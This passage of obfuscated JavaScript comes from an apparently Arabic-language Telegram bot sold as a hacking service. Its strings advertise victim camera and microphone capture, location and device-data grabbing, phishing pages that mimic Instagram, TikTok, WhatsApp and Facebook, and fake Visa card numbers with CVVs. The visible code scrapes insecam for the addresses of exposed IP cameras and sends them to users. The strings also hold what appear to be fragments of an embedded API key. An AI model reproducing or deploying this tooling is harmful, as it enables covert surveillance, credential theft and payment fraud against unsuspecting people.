        '`\x0a*[-]\x20CVV',
        'ام\x20بنجاح.',
        '\x0a<code>',
        'username',
        '\x20الصور',
        'IMNBz',
        'backQuery',
        'ًا\x20',
        'k.html',
        'خطأ.',
        'me/',
        'مل\x20السابق\x20',
        'KbHyp',
        '\x20✋\x0a\x20\x20\x20\x20\x20\x20\x20',
        'ضغط\x20على\x20هذ',
        '\x20اي\x20برمجيا',
        'مدفوع\x20بسعر',
        '\x20الرسائل:',
        'inline_key',
        '\x0a\x0a\x0a\x20\x20\x20\x20\x20\x20\x20',
        'الصور\x20الرا',
        '*[-]\x20Card\x20',
        'values',
        'wStRM',
        'سويسرا\x20🇨🇭',
        'لصورة\x20بنجا',
        'الضحيه\x20📲',
        'خل\x20إلى\x20الر',
        'dZBCt',
        'IT\x20-\x20VISA\x20',
        'إيميل\x20الذي',
        'ouCAD',
        'HTJwB',
        'GFgbU',
        'بط\x20جديد\x20',
        'اصطناعي\x20🤖',
        'PwRLD',
        'للحصول\x20على',
        'getUserPro',
        'SRJGa',
        'غط\x20على\x20الز',
        'Agent',
        'ObNfA',
        'uery\x22:\x22',
        '\x20انشـاء\x20بر',
        'BPHnI',
        'لجهاز:\x20',
        '\x20الاتصال.',
        'get_link_',
        'لاستخراج',
        's\x20for\x20chat',
        'AZqli',
        '/email/new',
        '\x20للمتصفح:\x20',
        'د\x20الأنوية:',
        'SIGHUP',
        'j1u7p1lXXG',
        'البوسنة\x20وا',
        '\x20الجهاز:\x20',
        'الملف\x20الشخ',
        'toISOStrin',
        '\x20🔄\x0a-\x20عمق\x20ا',
        'م\x20في\x20طلب\x20ك',
        'get',
        'match',
        'كل\x20صحيح.',
        'ngan.glitc',
        'بورتوريكو\x20',
        'IMBFM',
        '0\x20(Windows',
        'LqBdO',
        'ع\x20اضافة\x20فا',
        'هونغ\x20كونغ',
        'SACxr',
        'كولومبيا\x20🇨🇴',
        'إستونيا',
        'الرجاء\x20إرس',
        'خره\x20او\x20حاو',
        'blog',
        '@hsosgh',
        'راق\x20كامراة',
        'then',
        'لذي\x20رسلك\x20ه',
        'KwfDJ',
        'آيسلندا\x20🇮🇸',
        'IenUN',
        'get_pubg',
        'axios',
        'uuid',
        'ان\x20تخترقك\x20',
        'dvRnC',
        'BpUwd',
        'ل\x20عن\x20800حر',
        'use',
        '://t.me/',
        'randomByte',
        'الصوره\x20',
        '*👤\x20معلومات',
        'JACuB',
        'تركيا\x20🇹🇷',
        'ePLkK',
        'cHLFf',
        '*الاسم\x20:\x20',
        '🇪🇪',
        'ي\x20ع\x20الكثير',
        '\x20ما</stron',
        'وة\x20الامان\x20',
        '&duration=',
        'cKgKc',
        'UFkzD',
        'لا\x20توجد\x20صو',
        'params',
        '\x0aلحذف\x20الاي',
        'توغو\x20🇹🇬',
        'lo.html',
        'لرجاء\x20المح',
        'multer',
        'هولندا\x20🇳🇱',
        '\x20🇨🇮',
        'ة...',
        'نيبال\x20🇳🇵',
        'UDKtI',
        'AAWYq',
        'create_ema',
        '\x20📜\x0a-\x20نوع\x20ا',
        '\x20إلى\x20التلغ',
        'ساحل\x20العاج',
        'يراد\x20الأرق',
        'لى\x20رابط\x20ال',
        'حدث\x20خطأ:\x20',
        'ojsKJ',
        'body',
        'ناء\x20إرسال\x20',
        '/ok.html',
        'ync',
        'ستقبال\x20الا',
        'wBeeo',
        'hex',
        'hVxgk',
        'firstName',
        '\x20المراقبه\x20',
        'listen',
        'سو\x20🇧ﺫ',
        '.temp-mail',
        '/email/',
        'anypR',
        'onPgy',
        'عزيزي\x20حمود',
        'images',
        'captureFro',
        'Error\x20send',
        'o\x20for\x20chat',
        'ook:',
        '\x20:\x20',
        '/g.html?ch',
        'الأردن\x20🇯🇴',
        'dykjx',
        'YrCnJ',
        'ذا\x20المميزه',
        'me/VlP_12',
        'لة\x20حالياً',
        'نامج\x20وحذف\x20',
        'lchnX',
        'dIGEOjpMgZ',
        '\x20GB\x20💾\x0a-\x20عد',
        'أيرلندا\x20🇮🇪',
        'Verificati',
        'ed.',
        'لاوس\x20🇱🇦',
        '\x20المستخدم:',
        'hatId=',
        'ير\x20chatId\x20',
        'repeat',
        '🇳🇿',
        'file',
        'WymYk',
        'لم\x20تفتح\x20ال',
        '░░░░░░░]\x202',
        'nLGMq',
        'd\x20or\x20video',
        '\x22,\x22redux_n',
        '\x20الي\x2030\x20نط',
        'DBLxN',
        'ber',
        '<strong>•\x20',
        'yyeUH',
        'HojCP',
        'uMaCo',
        'chatId',
        'بولندا\x20🇵🇱',
        'احصل\x20على\x20ر',
        'ice.glitch',
        'إسبانيا\x20🇪🇸',
        'bluetoothS',
        'tymEB',
        'atId=',
        '\x20من\x20VIP.',
        'ZvYOD',
        'slice',
        'https://mo',
        'تم\x20إرسال\x20م',
        'mJLpp',
        'RnGtt',
        'قيرغيزستان',
        'ا\x20الرجاء\x20ا',
        'م\x20مستخدم',
        'أفغانستان\x20',
        'tiktok.com',
        'لف\x20الشخصي:',
        'ختلفه\x20او\x20ح',
        'يرات\x20المرا',
        'YPSNH',
        'OrWks',
        'ل\x20وهمي\x20💌',
        'https://ap',
        '🇺🇿',
        'sing\x20chatI',
        'خرى\x20لاحقًا',
        'HTML',
        '-\x20نوع\x20الات',
        'cleanuri',
        'جاري\x20اخترا',
        'essing\x20vid',
        '\x20الحصول\x20عل',
        'HwKSO',
        'zuoTv',
        'WXYEy',
        'FjIDd',
        'bUqdS',
        'السودان\x20🇸🇩',
        'غيرنزي\x20🇬🇬',
        '/whatsapp',
        'الكثير\x20من\x20',
        'ل\x20كود\x20الرق',
        '\x20⏰\x0a-\x20اسم\x20ا',
        'send',
        'م\x20استلمها\x20',
        'ntry\x20:*\x20`',
        'ليبيا\x20🇱🇾',
        'filter',
        'wltpY',
        '\x20🌍\x0a-\x20الدعم',
        'رة\x20(RAM):\x20',
        'WWizw',
        'tor',
        'isa',
        'اتباع\x20الأو',
        'حدث\x20خطأ',
        'ar-SA',
        'رام.',
        'البرتغال',
        'وله\x20بسبب\x20ق',
        'Error\x20chec',
        'امرا\x20الخلف',
        '\x20IP:\x20',
        'JBXAv',
        'USA🇺🇸',
        'CoHzn',
        'e\x20Visa!*',
        'ZAtCJ',
        'nQLmq',
        'Error\x20fetc',
        'تم\x20استلام\x20',
        '\x20كاميرات\x20ا',
        'country',
        'vJkgw',
        'zCFNw',
        'رواندا\x20🇷🇼',
        'لبت\x20باسورد',
        'r\x20data\x20for',
        's.html',
        'انشاء\x20📅\x20:\x20',
        'contact',
        'لرقام\x20الضح',
        'افته\x20كـ\x20VI',
        'nMTQi',
        'neNumber',
        '@lTV_l',
        '\x20🇰🇾',
        'post',
        'بعد</stron',
        'Id\x20',
        'فتيارات\x20شب',
        'لزر\x20لفحص\x20ا',
        'zCfbc',
        'last_name',
        'ca.html',
        'صه\x20لمن\x20نجد',
        'التشيك\x20🇨🇿',
        'طلب\x20الكود\x20',
        'ية\x20فيديو\x20🎥',
        '*الايدي\x20:\x20',
        'orig',
        'دم\x20VIP',
        '\x20على\x20رقم\x20و',
        'osVersion',
        'r_query',
        'exit',
        'ل\x20المطور\x20\x0a',
        'الصين\x20🇨🇳',
        'لزر\x20للحصول',
        'dWOVy',
        'sendPhoto',
        'ور\x20🎨',
        'أرسل\x20لي\x20اا',
        'SoiDs',
        'مستخدم\x20لإض',
        'سلوفاكيا\x20🇸🇰',
        'الفلبين\x20🇵🇭',
        'تنزانيا\x20🇹🇿',
        'urlencoded',
        'env',
        'irlkH',
        'resource_r',
        'تم\x20انشاء\x20ر',
        'ltSIb',
        'تم\x20إرسال\x20ا',
        '🇱🇺',
        'VISA\x20-\x20DEB',
        'untry/',
        'ZMbDU',
        'ر\x20لتوليد\x20ر',
        'QYkCh',
        'fetch\x20visa',
        'flEYB',
        'الإكوادور\x20',
        'otocol',
        'gram',
        'memory',
        'QtWuw',
        'Error\x20proc',
        'sFZYk',
        'FQVYD',
        '5Iw5wkVItL',
        'bvugo',
        'ecRfL',
        'IvQrG',
        'روسيا',
        'linkId',
        'SOBWp',
        'ل\x20على1\x20نقط',
        'هولندا',
        'NOVlC',
        'XIKOb',
        'مرحبًا!\x20بك',
        'خال\x20رقم\x20ال',
        '`\x0a*[-]\x20Val',
        'lBBme',
        'igvZd',
        'nSsem',
        'ال\x20للتحقق\x20',
        'Sent\x20photo',
        'uRYWP',
        'رجاء\x20\x20عدم\x20',
        'ike\x20Gecko)',
        'hrNDM',
        'قم\x20بإرسال\x20',
        'rymyy',
        'TnZJv',
        '\x20و\x20الحذر\x20م',
        'لرابط\x20إليك',
        'QFXES',
        'request_ve',
        'تشيلي\x20🇨🇱',
        'خول\x20لرابط\x20',
        'ata:',
        'مرحبًا\x20بك\x20',
        'Pqobf',
        'min',
        'snapchat.c',
        'eText',
        'منغوليا\x20🇲🇳',
        'Capital\x20On',
        'ول\x20الي\x20الر',
        'vRyKp',
        '\x20على\x20البري',
        '`\x0a*=======',
        '\x20اي\x20صوره\x20ف',
        '/start',
        '\x20\x22https\x22.',
        'UATTk',
        '*Hi\x20Bro,\x20I',
        'ر\x0aاقتراحات',
        'لا\x20توجد\x20نب',
        'instagram.',
        'KhyIk',
        'chat',
        'اكتب\x20لي\x20رس',
        'جورجيا\x20🇬🇪',
        'pHQHO',
        'HVGNC',
        '\x20ميغابت\x20في',
        'w.pinteres',
        'board',
        '🇭🇰',
        'بك!\x20وحصلت\x20',
        'nkScd',
        'عمان\x20🇴🇲',
        '\x0aانمي\x0aوالم',
        'اب\x20أولاً</',
        '`\x0a*[-]\x20Car',
        '\x20أثناء\x20محا',
        '🇪🇨',
        'معرفة\x20رقم\x20',
        'ال\x20الرابط\x20',
        'dcNro',
        'أذربيجان\x20🇦🇿',
        'forEach',
        '\x22scope\x22:\x22p',
        '/:userId',
        'https://ww',
        '░░░░░░░░░░',
        '6267280RjjKdM',
        'hvQTo',
        'فرنسا',
        'ر:\x20',
        'تم\x20انشاء\x20ا',
        'ق\x20كامراة\x20م',
        'NXOgw',
        'config',
        'لوكسمبورغ\x20',
        'اولة\x20مرة\x20أ',
        '\x20المطور',
        'dns',
        'له\x20🌏\x20:\x20',
        'get_link',
        'lGkLh',
        'https://cu',
        'Generate\x20V',
        'SZXhI',
        'Nlngr',
        'OacgY',
        '🇺🇸',
        'h.me/',
        'فحص\x20الرواب',
        'اختراق\x20فري',
        'كندا\x20🇨🇦',
        'الذي\x20يمكن\x20',
        'يره\x20جداً\x20ب',
        '/record/:l',
        'ابه\x20تلجرام',
        '🇷🇺',
        'لوحة\x20التحك',
        'ترينيداد\x20و',
        'تم\x20اختراق\x20',
        '🇳🇱',
        'SEIVY',
        'أخرى\x20لاحق😁',
        'جلد:\x20',
        'fShfe',
        'muLpl',
        'ه\x20بنسبه\x20لن',
        'ح\x20المميزات',
        'نة:\x20',
        'ع\x201نقطه\x20عن',
        'يه\x20الاصيله',
        'لمعلومات:\x20',
        'مؤقتة.',
        'sIHCg',
        '\x20|\x20في\x20بـوت',
        '617124NTIard',
        'إندونيسيا',
        '<strong>لم',
        'السويد',
        'ث\x20خطأ\x20أثنا',
        'مك\x20المنحرف',
        'كازاخستان',
        '\x20Visa...\x0a[',
        'لبنان\x20🇱🇧',
        'www',
        'ي\x20في\x20لوحة\x20',
        'YJIcKlujfP',
        'طلب\x20اي\x20اذن',
        'البرتغال\x20🇵🇹',
        'yvEkv',
        '<strong>اه',
        'ندما\x20توصل\x20',
        'ng>يرجى\x20ات',
        'البحرين\x20🇧🇭',
        'ماكاو\x20🇲🇴',
        'mat\x20is\x20not',
        'rong>',
        'xVgSh',
        'deleteMess',
        'ابط\x20لإضافة',
        'Obbwn',
        'gpt-3.5-tu',
        'floor',
        'الدومينيكا',
        '\x0a<strong>ي',
        '.txt',
        'uWQiY',
        'ء\x20جلب\x20الرس',
        'جزر\x20كايمان',
        'on...\x0a[░░░',
        'hCCPZ',
        'جمع\x20معلوما',
        'hbLRJ',
        'zYiZB',
        'حساب\x20جديد⚠️',
        '229452XDkLFU',
        'substring',
        'هونغ\x20كونغ\x20',
        'JuJmk',
        'خطأ\x20في\x20جلب',
        'qXrLd',
        'ت\x20بنات\x0aخلف',
        'tPFpd',
        'SnaDg',
        'qrOfg',
        'nImvp',
        '/ios',
        'get_love_m',
        'nlNyb',
        'NLcYj',
        'first_name',
        'o\x20]</stron',
        'ase\x20try\x20ag',
        'MdrLD',
        'ل\x20وهمي',
        'mKXll',
        '\x20الرجاء\x20تغ',
        'me/ygf2gbo',
        'creator',
        ')\x20AppleWeb',
        'الدخول\x20\x20له',
        'writeFileS',
        'fuschia-lo',
        'يا\x20🇿🇦',
        'لهاتف:\x20',
        'LSEho',
        '🇵🇷',
        'zTwOD',
        '\x20📡\x0a-\x20الوقت',
        'ORRNr',
        '\x20أثناء\x20إرس',
        '🇳🇮',
        'xUTZs',
        'MthZP',
        'الصين',
        'on/',
        'ط\x20🪄',
        'سريلانكا\x20🇱🇰',
        'فه\x20ولكن\x20لا',
        'content',
        'holder.tex',
        'text',
        'voice',
        '\x20🔞',
        'الصوره📸\x20',
        'ميع\x20قنوات\x20',
        'removeList',
        'time',
        'DdWlj',
        'uploads',
        '\x20تلقائي\x20',
        'essage',
        'jkyJA',
        'لموقع\x20الجغ',
        'VIlWU',
        'ins\x22}}',
        'uJMFx',
        'هاز\x20بنجاح',
        '@oapajh',
        'بلوتوث:\x20',
        'جعلته\x20مشبو',
        'ت\x20الجهاز',
        'اشترك\x20في\x20',
        '`\x0a*[-]\x20Exp',
        '/ca.html',
        'الصوره🙋‍♂️\x20',
        'يتك\x20في\x20الد',
        'ss\x20the\x20but',
        'administra',
        'sendVideo',
        '&type=tikt',
        'add_names',
        'trong>',
        '/getLocati',
        'MCApn',
        'cSkXu',
        'rce/get/?s',
        '/submitLoc',
        '\x20اخره\x20لاحق',
        'nopfS',
        'message:',
        'ة:\x20',
        'SIGINT',
        'UyzMJ',
        'قه\x20سيتم\x20فت',
        'link',
        '\x20رابط\x20لالت',
        'existsSync',
        'readFileSy',
        'node-teleg',
        'elHdk',
        'rbxPQ',
        'س\x20تسخدمه\x20ف',
        '▓▓▓▓▓▓░░░░',
        'وشكرا.',
        'KEZMs',
        'تلغيم\x20رابط',
        'ناء\x20محاولة',
        'السويد\x20🇸🇪',
        'ابط\x20التقاط',
        'جزر\x20فارو\x20🇫🇴',
        'xvCti',
        'sgeKh',
        '.jpg',
        'LSQPE',
        '\x20🇰🇬',
        '\x20:\x20`',
        'rssbZ',
        'cheerio',
        '\x20🔒',
        'rhxEh',
        'آمن.',
        'er.glitch.',
        '\x20مهمه\x20اذا\x20',
        'غوادلوب\x20🇬🇵',
        '.io/api/v3',
        'dERfd',
        '*اليوزر\x20:\x20',
        'uFRrk',
        '000',
        'المجر\x20🇭🇺',
        'XcIqA',
        'روسيا\x20🇷🇺',
        'اعطيني\x20نكت',
        'قتة:',
        'type',
        'XReEE',
        'toLowerCas',
        'دولة\x20غير\x20م',
        '437547mWWdSp',
        '▓░░░░░░]\x205',
        'AoYwJ',
        'OkBfQ',
        'express',
        'dRZAz',
        'اوت',
        'answerCall',
        'agabb',
        'whatsapp.c',
        'keys',
        'تايلاند\x20🇹🇭',
        'UQacU',
        'أوكرانيا\x20🇺🇦',
        'Received\x20p',
        'الرقام\x20وهم',
        'ك\x20VIP',
        'tOeab',
        'tjXuS',
        '&type=inst',
        'UIkFd',
        'quest:\x20Mis',
        'أرمينيا\x20🇦🇲',
        '\x20الثانية)\x0a',
        'king\x20subsc',
        'في\x20هذا\x20الد',
        '\x20الجهاز:',
        'إيران\x20🇮🇷',
        'صال:\x20',
        'ال\x20الخاصة\x20',
        'lRVyc',
        'ية\x20📷',
        'isCharging',
        '-\x20بوت\x20بحث\x20',
        'EAVMj',
        'total_coun',
        'RGbZZ',
        'قطر\x20🇶🇦',
        'FhWSY',
        '\x2030\x20نقطه\x20ي',
        'له\x20تتوفر\x20ه',
        'ألمانيا\x20🇩🇪',
        '2BT3BlbkFJ',
        'سيتم\x20فتح\x20ا',
        'get_joke',
        'نيكاراغوا\x20',
        'aZQuO',
        'networkSpe',
        'check_link',
        '\x20عاليه\x20🖼',
        'toString',
        'app/',
        'من\x20هذا\x20الد',
        'toLocaleTi',
        'YEzPS',
        'فنزويلا\x20🇻🇪',
        'nKDib',
        'videoData',
        'tqpXx',
        '/json',
        '/submitVoi',
        'pin',
        'ألبانيا\x20🇦🇱',
        'zlAGg',
        'kAObX',
        'countryNam',
        'قر\x20على\x20الز',
        '\x20استخدام\x20ا',
        'memoryStor',
        'PoIsi',
        'لجميع\x20المو',
        'بط\x20دعوة',
        'PORT',
        '\x20حذف\x20حسابك',
        'طة.\x0a:\x20http',
        'lnHtO',
        'لقد\x20قام\x20ضح',
        'isDirector',
        'النرويج\x20🇳🇴',
        'ZgDkY',
        'لقد\x20قمت\x20بط',
        'jfiGU',
        'i.openai.c',
        'capture_vi',
        'ilVzO',
        'اختراق\x20الم',
        'سحب\x20جميع\x20ا',
        'Win64;\x20x64',
        'wdzbH',
        '\x20الرسالة.\x20',
        'SunTrust\x20B',
        '🔗\x20توليد\x20را',
        'choices',
        '50mb',
        'كوريا\x20الشم',
        'التحكم:',
        '\x20🇹🇲',
        '100mb',
        'luhyp',
        'لهجه\x20اليمن',
        'collect_de',
        'ain\x20later.',
        'ث\x20عن\x20صور.\x0a',
        'تم\x20استخدام',
        'qXuPk',
        'DCwtW',
        'uKTDN',
        'لألوان:\x20',
        'pQQPi',
        'UzIXV',
        'fPHqC',
        '<strong>ال',
        'ktHyX',
        'سحب\x20جميع\x20ر',
        'userLink',
        'UkTXM',
        'uHbsR',
        '\x20بإنشاء\x20حس',
        'المغرب\x20🇲🇦',
        'XaDLf',
        'index',
        'CFlse',
        'ton\x20below\x20',
        'urce/BaseS',
        '\x20data.\x20Ple',
        'خطير\x20جداً\x20',
        's24.me/en/',
        '\x20جهة\x20الاتص',
        'SZpyZ',
        'رك\x20ذنبكم\x20ب',
        'غانا\x20🇬🇭',
        'ف\x20\x20رساله\x20ج',
        'قع\x20والبرام',
        'json',
        'ر\x20مجاناً:',
        'rmdirSync',
        'split',
        'ت\x20خبيثه\x20خا',
        'get_camera',
        'شاء\x20⏰\x20:\x20',
        '\x20مراقبه\x20لل',
        '🇰🇿',
        'بليز\x20🇧🇿',
        'cOtyv',
        'redirect',
        'CXvCb',
        '\x20فاير',
        'كينيا\x20🇰🇪',
        'المطور\x20قبل',
        'خاص\x20بك\x0a\x20عن',
        'os\x20for\x20cha',
        'DMxgd',
        'hHued',
        'وة\x20امانها\x20',
        'ميانمار\x20🇲🇲',
        'request_co',
        'FbfAW',
        '\x20لتقنية\x20ال',
        'ور\x20الهاتف\x20',
        'esponse',
        'hMPBH',
        '\x20المحتله\x20🇮🇱',
        'بحث\x20عن\x20صور',
        '.insecam.o',
        't?start=',
        'Ymkkn',
        '\x20انشاء\x20ايم',
        'status',
        '\x20المحظور\x20م',
        'yoCOH',
        'لقائي\x20',
        'الحصول\x20على',
        'ابدأ\x20الاخت',
        'ق\x20الهاتف\x20ك',
        'ود\x20🇲🇪',
        '</strong>',
        'تخدمين:\x20',
        'يس\x20اسمي',
        'vUumL',
        'فنلندا',
        'ول\x20اليه\x20ال',
        '\x27m*\x20[™](t.',
        'إسبانيا',
        'hw.vercel.',
        'مكنك\x20إنشاء',
        'تركمانستان',
        'tXyVu',
        'هندوراس\x20🇭🇳',
        'aCpqi',
        'https://fa',
        'EeNuf',
        'F.html',
        'search_ima',
        'nt:',
        'اب\x20لفك\x20الح',
        'اختراق\x20فيس',
        'ubAdO',
        '\x20📏\x0a-\x20إصدار',
        'next_',
        'قد\x20حدث\x20خطأ'
    ];
    _0x2725 = function () {
        return _0x308706;
    };
    return _0x2725();
}
async function saveVipUsers() {
    const _0x101e0b = _0x544f76, _0x1a06a5 = { 'xaysh': _0x101e0b(0x2e6) };
    await storage[_0x101e0b(0x48c)](_0x1a06a5[_0x101e0b(0x898)], vipUsers);
}
function showCountryList(_0x395793, _0x4fcb6e = -0xec5 + -0x510 + -0x13d5 * -0x1) {
    const _0x51c382 = _0x544f76, _0x2363c0 = {
            'vyGux': function (_0x4258d0, _0x26e58d) {
                return _0x4258d0 + _0x26e58d;
            },
            'MAiuy': function (_0x5bfab0, _0x4535a4) {
                return _0x5bfab0 < _0x4535a4;
            },
            'vUumL': function (_0x1ff462, _0x3e743c) {
                return _0x1ff462 < _0x3e743c;
            },
            'yPXlM': function (_0x50991f, _0x1bac45) {
                return _0x50991f + _0x1bac45;
            },
            'HGnWz': function (_0x48884b, _0x2edd56) {
                return _0x48884b < _0x2edd56;
            },
            'BYhge': function (_0x25cec7, _0x112c8d) {
                return _0x25cec7 > _0x112c8d;
            },
            'nlNyb': _0x51c382(0x4a1),
            'SOBWp': _0x51c382(0x2de) + 'ة:'
        };
    try {
        const _0x183e4e = [], _0x33d1b4 = Object[_0x51c382(0x73a)](countryTranslation), _0x26e153 = Object[_0x51c382(0x4cc)](countryTranslation), _0x33d6b9 = Math[_0x51c382(0x626)](_0x2363c0[_0x51c382(0x326)](_0x4fcb6e, -0x1561 + -0x826 * 0x3 + 0x2e36), _0x33d1b4[_0x51c382(0x23e)]);
        for (let _0x33e3ad = _0x4fcb6e; _0x2363c0[_0x51c382(0x28b)](_0x33e3ad, _0x33d6b9); _0x33e3ad += -0x1639 + 0x12a1 * 0x1 + -0x39b * -0x1) {
            const _0x2de3a2 = [];
            for (let _0x5785e3 = _0x33e3ad; _0x2363c0[_0x51c382(0x7e2)](_0x5785e3, _0x2363c0[_0x51c382(0x917)](_0x33e3ad, 0x82e + -0xb14 * 0x2 + -0xdfd * -0x1)) && _0x2363c0[_0x51c382(0x88f)](_0x5785e3, _0x33d6b9); _0x5785e3++) {
                const _0x36d6fd = _0x33d1b4[_0x5785e3], _0x4b012a = _0x26e153[_0x5785e3];
                _0x2de3a2[_0x51c382(0x3f0)]({
                    'text': _0x4b012a,
                    'callback_data': _0x36d6fd
                });
            }
            _0x183e4e[_0x51c382(0x3f0)](_0x2de3a2);
        }
        const _0x475a5e = [];
        _0x2363c0[_0x51c382(0x802)](_0x4fcb6e, 0xe90 + 0x17c5 + -0x2655) && _0x475a5e[_0x51c382(0x3f0)], _0x2363c0[_0x51c382(0x28b)](_0x33d6b9, _0x33d1b4[_0x51c382(0x23e)]) && _0x475a5e[_0x51c382(0x3f0)]({
            'text': _0x2363c0[_0x51c382(0x6b7)],
            'callback_data': _0x51c382(0x7f6) + _0x33d6b9
        }), _0x475a5e[_0x51c382(0x23e)] && _0x183e4e[_0x51c382(0x3f0)](_0x475a5e), bot[_0x51c382(0x84f) + 'e'](_0x395793, _0x2363c0[_0x51c382(0x609)], { 'reply_markup': { 'inline_keyboard': _0x183e4e } });
    } catch (_0x417a3a) {
        bot[_0x51c382(0x84f) + 'e'](_0x395793, _0x51c382(0x24b) + _0x51c382(0x3ff) + _0x51c382(0x2d0) + _0x417a3a[_0x51c382(0x320)]);
    }
}
async function displayCameras(_0x48a746, _0x4d4370) {
    const _0xd38062 = _0x544f76, _0x222c43 = {
            'Pqobf': _0xd38062(0x593) + _0xd38062(0x657) + _0xd38062(0x4b5),
            'WDJbp': function (_0x27b2fc, _0x1317c4) {
                return _0x27b2fc < _0x1317c4;
            },
            'nKDib': function (_0x4c4856, _0x3ce47f) {
                return _0x4c4856 % _0x3ce47f;
            },
            'rxsVH': _0xd38062(0x22b) + _0xd38062(0x4fb) + _0xd38062(0x445) + _0xd38062(0x787) + _0xd38062(0x6c2) + _0xd38062(0x8ef) + _0xd38062(0x194) + _0xd38062(0x618) + _0xd38062(0x8fb) + _0xd38062(0x8bb) + _0xd38062(0x1fc) + '6',
            'lBQpR': _0xd38062(0x8c4) + _0xd38062(0x506) + _0xd38062(0x542) + _0xd38062(0x749) + _0xd38062(0x5b1) + _0xd38062(0x520) + _0xd38062(0x2b9) + _0xd38062(0x587) + _0xd38062(0x3e6) + _0xd38062(0x831),
            'IvQrG': function (_0x1435b3, _0x4b8e4b, _0x1bf83b) {
                return _0x1435b3(_0x4b8e4b, _0x1bf83b);
            },
            'DJEcs': function (_0x3f0ba4, _0x3cf7b1) {
                return _0x3f0ba4 <= _0x3cf7b1;
            },
            'fTxdx': function (_0x1b4796, _0x4dd30b) {
                return _0x1b4796 < _0x4dd30b;
            },
            'dRZAz': function (_0x226686, _0x32242e) {
                return _0x226686 + _0x32242e;
            },
            'oZWVP': _0xd38062(0x453) + _0xd38062(0x506) + _0xd38062(0x542) + _0xd38062(0x764) + _0xd38062(0x815) + _0xd38062(0x3f7) + _0xd38062(0x255) + _0xd38062(0x687) + _0xd38062(0x377) + _0xd38062(0x720) + _0xd38062(0x566) + _0xd38062(0x217) + _0xd38062(0x3a4) + _0xd38062(0x5c2) + _0xd38062(0x3a2) + _0xd38062(0x288) + _0xd38062(0x2f7) + _0xd38062(0x6fd) + _0xd38062(0x4bd),
            'rJCWK': _0xd38062(0x8c4) + _0xd38062(0x506) + _0xd38062(0x542) + _0xd38062(0x749) + _0xd38062(0x5b1) + _0xd38062(0x7c9) + _0xd38062(0x41b) + _0xd38062(0x503) + _0xd38062(0x3c0) + _0xd38062(0x944)
        };
    try {
        const _0x4a5bca = await bot[_0xd38062(0x84f) + 'e'](_0x48a746, _0x222c43[_0xd38062(0x625)]), _0x5356e5 = _0x4a5bca[_0xd38062(0x342)];
        for (let _0x45b377 = -0x103 + 0xca * 0x16 + 0x573 * -0x3; _0x222c43[_0xd38062(0x2e9)](_0x45b377, 0x19fd + 0x2d * -0x9b + 0x151); _0x45b377++) {
            await bot[_0xd38062(0x432) + _0xd38062(0x628)](_0xd38062(0x593) + _0xd38062(0x657) + _0xd38062(0x29e) + '.'[_0xd38062(0x562)](_0x222c43[_0xd38062(0x768)](_0x45b377, -0xddb + 0x2 * -0xbed + 0x25b9)), {
                'chat_id': _0x48a746,
                'message_id': _0x5356e5
            }), await new Promise(_0x2436f7 => setTimeout(_0x2436f7, -0x167e + -0xe29 + -0x1 * -0x288f));
        }
        const _0x1afc43 = _0xd38062(0x8c9) + _0xd38062(0x7d3) + _0xd38062(0x8b3) + _0xd38062(0x5f5) + _0x4d4370, _0x4bcc61 = { 'User-Agent': _0x222c43[_0xd38062(0x49c)] };
        let _0x316e89 = await axios[_0xd38062(0x4f5)](_0x1afc43, { 'headers': _0x4bcc61 });
        const _0x3f1889 = _0x316e89[_0xd38062(0x8fe)][_0xd38062(0x4f6)](/pagenavigator\("\?page=", (\d+)/);
        if (!_0x3f1889) {
            bot[_0xd38062(0x84f) + 'e'](_0x48a746, _0x222c43[_0xd38062(0x33a)]);
            return;
        }
        const _0x556eed = _0x222c43[_0xd38062(0x606)](parseInt, _0x3f1889[0x51f * -0x5 + 0x11 * 0x65 + 0x12e7], 0x22 * 0x8a + -0x4 * -0x169 + -0xbf7 * 0x2), _0x59a5db = [];
        for (let _0x393742 = 0x1324 + 0xc22 * -0x1 + 0x1 * -0x701; _0x222c43[_0xd38062(0x1c5)](_0x393742, _0x556eed); _0x393742++) {
            _0x316e89 = await axios[_0xd38062(0x4f5)](_0x1afc43 + _0xd38062(0x93c) + _0x393742, { 'headers': _0x4bcc61 });
            const _0x172971 = _0x316e89[_0xd38062(0x8fe)][_0xd38062(0x4f6)](/http:\/\/\d+\.\d+\.\d+\.\d+:\d+/g) || [];
            _0x59a5db[_0xd38062(0x3f0)](..._0x172971);
        }
        if (_0x59a5db[_0xd38062(0x23e)]) {
            const _0x1aa4ef = _0x59a5db[_0xd38062(0x430)]((_0x16c619, _0x15939c) => _0x15939c + (0x28f * -0xb + -0x11 * 0x94 + -0x2 * -0x12fd) + '.\x20' + _0x16c619);
            for (let _0x27b6d1 = 0x8ed * 0x2 + 0x281 + -0x145b; _0x222c43[_0xd38062(0x447)](_0x27b6d1, _0x1aa4ef[_0xd38062(0x23e)]); _0x27b6d1 += 0x6cf * 0x2 + -0x1 * 0x16af + 0x943 * 0x1) {
                const _0x5d1c4b = _0x1aa4ef[_0xd38062(0x57c)](_0x27b6d1, _0x222c43[_0xd38062(0x735)](_0x27b6d1, 0x12ea + -0x3 * 0x5e + -0x119e));
                await bot[_0xd38062(0x84f) + 'e'](_0x48a746, _0x5d1c4b[_0xd38062(0x1ec)]('\x0a'));
            }
            await bot[_0xd38062(0x84f) + 'e'](_0x48a746, _0x222c43[_0xd38062(0x3db)]);
        } else
            await bot[_0xd38062(0x84f) + 'e'](_0x48a746, _0x222c43[_0xd38062(0x860)]);
    } catch (_0x53aad0) {
        await bot[_0xd38062(0x84f) + 'e'](_0x48a746, _0xd38062(0x8c4) + _0xd38062(0x506) + _0xd38062(0x542) + _0xd38062(0x749) + _0xd38062(0x5b1) + _0xd38062(0x7c9) + _0xd38062(0x41b) + _0xd38062(0x503) + _0xd38062(0x3c0) + _0xd38062(0x944));
    }
}
function isDeveloper(_0x5127cb) {
    const _0x15d3ff = _0x544f76, _0x5a7ad2 = {
            'zTwOD': function (_0x4328be, _0x109ade) {
                return _0x4328be === _0x109ade;
            }
        }, _0x17b6a9 = -0x16025c143 + 0xbb9a91aa + 0x3fd372d * 0x7f;
    return _0x5a7ad2[_0x15d3ff(0x6ca)](_0x5127cb, _0x17b6a9);
}
function showAdminPanel(_0x100ab9) {
    const _0x296caa = _0x544f76, _0xdb676b = {
            'lGkLh': _0x296caa(0x670) + 'م:',
            'BrrHf': _0x296caa(0x397) + _0x296caa(0x5db),
            'IMBFM': _0x296caa(0x267),
            'ORRNr': _0x296caa(0x44c) + _0x296caa(0x5db),
            'eZwmU': _0x296caa(0x3fe)
        };
    bot[_0x296caa(0x84f) + 'e'](_0x100ab9, _0xdb676b[_0x296caa(0x660)], {
        'reply_markup': {
